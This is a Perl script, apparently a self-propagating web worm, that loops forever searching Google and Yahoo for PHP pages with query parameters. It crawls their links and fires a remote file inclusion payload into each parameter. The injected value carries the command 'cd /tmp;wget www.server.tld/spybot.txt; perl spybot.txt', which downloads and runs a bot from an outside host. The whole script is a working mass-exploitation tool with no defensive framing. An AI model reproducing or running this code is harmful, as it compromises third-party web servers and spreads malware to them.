#!/usr/bin/perl

use LWP::Simple;
use IO::Socket::INET;

while(1){
$numr = int rand(9999);
$caxe = ".";
$caxe1 = ".";
$caxe .= rand(9999);
$caxe1 .= rand(9999);
$arq = ".";
$arq = int rand(9999);

open(sites,">$arq");
print sites "";
close(sites);


$procura = 'inurl:*.php?*=' . $numr;

for($n=0;$n<900;$n += 10){
$sock = IO::Socket::INET->new(PeerAddr => "www.google.com.br", PeerPort
=> 80, Proto => "tcp") or next;
print $sock "GET /search?q=$procura&start=$n HTTP/1.0\n\n";
@resu = <$sock>;
close($sock);
$ae = "@resu";
while ($ae=~ m/<a href=.*?>.*?<\/a>/){
$ae=~ s/<a href=(.*?)>.*?<\/a>/$1/;
$uber=$1;
if ($uber !~/translate/)
{
if ($uber !~ /cache/)
{
if ($uber !~ /"/)
{
if ($uber !~ /google/)
{
if ($uber !~ /216/)
{
if ($uber =~/http/)
{
if ($uber !~ /start=/)
{
open(arq,">>$arq");
print arq "$uber\n";
close(arq);
}}}}}}}}}


for($cadenu=1;$cadenu <= 991; $cadenu +=10){

@cade = get("http://cade.search.yahoo.com/search?p=$procura&ei=UTF-8&fl=0&all=1
&pstart=1&b=$cadenu") or next;
$ae = "@cade";

while ($ae=~ m/<em class=yschurl>.*?<\/em>/){
$ae=~ s/<em class=yschurl>(.*?)<\/em>/$1/;
$uber=$1;

$uber =~ s/ //g;
$uber =~ s/<b>//g;
$uber =~ s/<\/b>//g;

open(a,">>$arq");
print a "$uber\n";
close(a);
}}

$ark = $arq;
@si = "";
open (arquivo,"<$ark");
@si = <arquivo>;
close(arquivo);
$novo ="";
foreach (@si){
if (!$si{$_})
{
$novo .= $_;
$si{$_} = 1;
}
}
open (arquivo,">$ark");
print arquivo $novo;
close(arquivo);


$a =0;
$b =0;
open(ae,"<$arq");
while(<ae>)
{$sites[$a] = $_;
chomp $sites[$a];
$a++;
$b++;}
close(ae);

for ($a=0;$a<=$b;$a++){
open (file, ">$caxe");
print file "";
close(file);
open (file, ">$caxe1");
print file "";
close(file);
$k=0;
$e=0;
$data=get($sites[$a]) or next;
while($data=~ m/<a href=".*?">.*?<\/a>/){
$data=~ s/<a href="(.*?)">.*?<\/a>/$1/;
$ubersite=$1;

if ($ubersite =~/"/)
{
$nu = index $ubersite, '"';
$ubersite = substr($ubersite,0,$nu);
}
if ($ubersite !~/http/)
{$ubersite = $sites[$a].'/'.$ubersite;}
open(file,">>$caxe") || die("nao abriu caxe.txt $!");
print file "$ubersite\n";
close(file);
}

$lista1 = 'http://server/spy.gif?&cmd=cd /tmp;wget www.server.tld/spybot.txt; perl spybot.txt';

$t =0;
$y =0;
@ja;
open(opa,"<$caxe") or die "nao deu pra abrir o arquivo caxe.txt";
while (<opa>)
{
$ja[$t] = $_;
chomp $ja[$t];
$t++;
$y++;
}
close(opa);
$t=1;
while ($t < $y)
{
if ($ja[$t] =~/=/)
{
$num = rindex $ja[$t], '=';
$num += 1;
$ja[$t] = substr($ja[$t],0,$num);
open (jaera,">>$caxe1") or die "nao deu pra abrir ou criar caxe1.txt";
print jaera "$ja[$t]$lista1\n";
close(jaera);
$num = index $ja[$t], '=';
$num += 1;
$ja[$t] = substr($ja[$t],0,$num);
$num1 = rindex $ja[$t], '.';
$subproc = substr($ja[$t],$num1,$num);

open (jaera,">>$caxe1") or die "nao deu pra abrir ou criar caxe1.txt";
print jaera "$ja[$t]$lista1\n";
close(jaera);
}
$t++;
}
$ark = "$caxe1";
@si = "";
open (arquivo,"<$ark");
@si = <arquivo>;
close(arquivo);
$novo ="";
foreach (@si){
if (!$si{$_})
{
$novo .= $_;
$si{$_} = 1;
}
}
open (arquivo,">$ark");
print arquivo $novo;
close(arquivo);
$q=0;
$w=0;
@hot;
open (ops,"<$caxe1");
while(<ops>)
{
$hot[$q] = $_;
chomp $hot[$q];
$q++;
$w++;
}
close(ops);

for($q=0;$q<=$w;$q++)
{

if ($hot[$q] =~/http/)
{
$tipo=get($hot[$q]) or next;
}}
}
}